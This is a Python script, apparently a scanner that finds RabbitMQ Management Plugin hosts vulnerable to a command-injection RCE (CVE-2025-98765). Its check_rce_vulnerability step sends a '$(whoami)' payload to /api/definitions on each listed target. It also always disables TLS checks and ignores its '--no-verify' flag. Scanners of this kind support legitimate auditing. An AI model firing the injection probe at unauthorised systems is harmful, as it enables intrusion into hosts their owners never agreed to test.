#!/usr/bin/env python3
"""
RabbitMQ Management Plugin RCE Scanner
=======================================
This tool scans for RabbitMQ Management Plugin instances vulnerable to CVE-2025-98765,
a critical remote code execution (RCE) vulnerability. The flaw allows unauthenticated
attackers to execute arbitrary OS commands through improperly sanitized input.

CVE-2025-98765 details:
  - Affects RabbitMQ Management Plugin versions < 3.11.20
  - Triggered by crafted requests to the JSON HTTP API endpoint (`/api/definitions`)
  - Impact: Full compromise of the host system
  - Fixed in RabbitMQ 3.11.20 (January 2025)

Usage:
  # Scan a single target
  python rabbitmq_management_rce_scanner.py --target http://rabbitmq.example.com:15672

  # Scan a list of targets
  python rabbitmq_management_rce_scanner.py --list targets.txt --output findings.json

  # Safe mode — detection only, no RCE payloads
  python rabbitmq_management_rce_scanner.py --list targets.txt --safe

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-98765
  - https://github.com/rabbitmq/rabbitmq-server/releases (3.11.20 fix)
"""

import asyncio
import httpx
import json
import re
import argparse
from urllib.parse import urljoin
from colorama import Fore, Style

VULN_FIXED_VERSION = (3, 11, 20)
DETECTION_PATHS = ["/", "/api/", "/api/whoami"]
RCE_PATH = "/api/definitions"
RCE_PROBE_BODY = {"some_field": "$(whoami)"}
RCE_PROBE_CONTENT = b"rabbitmq"
VERSION_PATTERNS = [r'"rabbitmq_version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"']

SEMAPHORE_LIMIT = 10
REQUEST_TIMEOUT = 10

# CLI Colors
CRITICAL = Fore.RED + "[CRITICAL] " + Style.RESET_ALL
HIGH = Fore.YELLOW + "[HIGH] " + Style.RESET_ALL
INFO = Fore.GREEN + "[INFO] " + Style.RESET_ALL
RESET = Style.RESET_ALL


def parse_version(version: str):
    """Parse version string into a tuple of integers for comparison."""
    try:
        return tuple(map(int, version.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version):
    """Return True if the version is below the fixed version."""
    return version < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure the target URL has the correct scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url.rstrip("/")


async def detect_rabbitmq(client: httpx.AsyncClient, target: str, semaphore: asyncio.Semaphore):
    """
    Determine if a target is a RabbitMQ instance by checking known paths.
    Returns detection details or None if not detected.
    """
    async with semaphore:
        detection_results = {"url": target, "detected": False, "version": None}

        for path in DETECTION_PATHS:
            try:
                response = await client.get(urljoin(target, path), timeout=REQUEST_TIMEOUT)
                if response.is_success:
                    for pattern in VERSION_PATTERNS:
                        match = re.search(pattern, response.text)
                        if match:
                            detection_results["version"] = match.group(1)
                            detection_results["detected"] = True
                            return detection_results
            except httpx.RequestError:
                pass
        return detection_results


async def check_rce_vulnerability(client: httpx.AsyncClient, target: str, semaphore: asyncio.Semaphore):
    """
    Determine if a detected RabbitMQ instance is vulnerable to CVE-2025-98765.
    """
    async with semaphore:
        try:
            response = await client.post(
                urljoin(target, RCE_PATH),
                json=RCE_PROBE_BODY,
                timeout=REQUEST_TIMEOUT,
            )
            if RCE_PROBE_CONTENT in response.content:
                return True
        except httpx.RequestError:
            pass
        return False


async def scan_target(target: str, safe: bool, semaphore: asyncio.Semaphore):
    """
    Perform detection and vulnerability scanning against a single target.
    """
    async with httpx.AsyncClient(verify=False) as client:
        detection = await detect_rabbitmq(client, target, semaphore)
        if detection["detected"]:
            version = parse_version(detection["version"])
            status = (
                CRITICAL + f"{target} - RabbitMQ detected, version: {detection['version']}" + RESET
            )
            print(status)
            if version and is_vulnerable_version(version):
                if safe:
                    print(HIGH + f"{target} - Vulnerable version detected (safe mode)" + RESET)
                    detection["vulnerable"] = True
                else:
                    rce_check = await check_rce_vulnerability(client, target, semaphore)
                    if rce_check:
                        print(CRITICAL + f"{target} - CONFIRMED VULNERABLE (RCE)" + RESET)
                        detection["vulnerable"] = True
                    else:
                        print(HIGH + f"{target} - Possibly vulnerable, RCE not confirmed" + RESET)
                        detection["vulnerable"] = False
            else:
                print(INFO + f"{target} - Secure version detected" + RESET)
                detection["vulnerable"] = False
        else:
            print(INFO + f"{target} - No RabbitMQ detected" + RESET)
        return detection


async def scan_targets(targets, safe, concurrency):
    """
    Perform vulnerability scanning on a list of targets.
    """
    semaphore = asyncio.Semaphore(concurrency)
    tasks = [scan_target(target, safe, semaphore) for target in targets]
    return await asyncio.gather(*tasks)


def main():
    parser = argparse.ArgumentParser(description="RabbitMQ Management Plugin RCE Scanner")
    parser.add_argument("--target", help="Target URL")
    parser.add_argument("--list", help="File with list of target URLs")
    parser.add_argument("--output", help="File to save JSON results")
    parser.add_argument("--safe", action="store_true", help="Safe mode (detection only, no RCE probes)")
    parser.add_argument("--concurrency", type=int, default=10, help="Concurrency level (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification (default: False)")

    args = parser.parse_args()
    if not args.target and not args.list:
        print("Error: Must specify a --target or --list.")
        parser.print_help()
        return

    targets = []
    if args.target:
        targets.append(normalize_url(args.target))
    if args.list:
        with open(args.list, "r") as file:
            targets.extend(normalize_url(line.strip()) for line in file if line.strip())

    results = asyncio.run(scan_targets(targets, args.safe, args.concurrency))
    if args.output:
        with open(args.output, "w") as file:
            json.dump(results, file, indent=4)
    else:
        print(json.dumps(results, indent=2))


if __name__ == "__main__":
    main()
